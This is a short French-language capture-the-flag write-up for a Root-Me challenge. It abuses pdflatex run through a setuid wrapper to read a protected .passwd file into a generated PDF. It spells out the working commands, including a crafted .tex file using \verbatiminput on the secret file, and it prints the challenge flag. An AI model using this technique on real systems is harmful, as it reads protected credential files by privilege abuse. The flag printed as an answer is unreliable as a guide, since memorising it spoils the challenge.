# LaTeX - Input

# Description : 

> Dans ce défi, il y a un script bash qui prend un fichier *.tex* en entrée et l'utilise pour générer un fichier *.pdf* avec le programme `pdflatex`.
> Il est donc possible de profiter de `pdflatex` pour inclure le fichier **.passwd** lors de la génération du *.pdf*.
> Une approche est proposée à gtfobins.github.io (https://gtfobins.github.io/gtfobins/pdflatex/).

# Exploit : 

> Tout d'abord, il faut créer un dossier dans **/tmp** qui sera utilisé pour héberger le fichier *.tex* contenant l'exploit.
> 
> `mkdir -p /tmp/ch23-exploit`
> 
> Ensuite, il faut créer le fichier *.tex* contenant l'exploit, en s'assurant qu'il pointe correctement vers le fichier **.passwd**.
> 
> `echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/challenge/app-script/ch23/.passwd}\end{document}' > /tmp/ch23-exploit/exploit.tex`
> 
> Enfin, il suffit d'exécuter le script via le wrapper pour gérer les droits d'exécution et lui passer le fichier *.tex* en paramètre.
> 
> `./setuid-wrapper /tmp/ch23-exploit/exploit.tex`
> 
> Le fichier *.pdf* sera généré dans un dossier sous **/tmp**. Il faudra donc récupérer ce fichier sur son propre ordinateur en utilisant, par exemple, scp.
> 
> `scp -P 2222 app-script-ch23@challenge02.root-me.org:/tmp/[NOM-DOSSIER]/main.pdf .`
> 
> Le flag sera indiqué en clair dans le *.pdf* : **LaTeX_1nput_1s_n0t_v3ry_s3kur3**
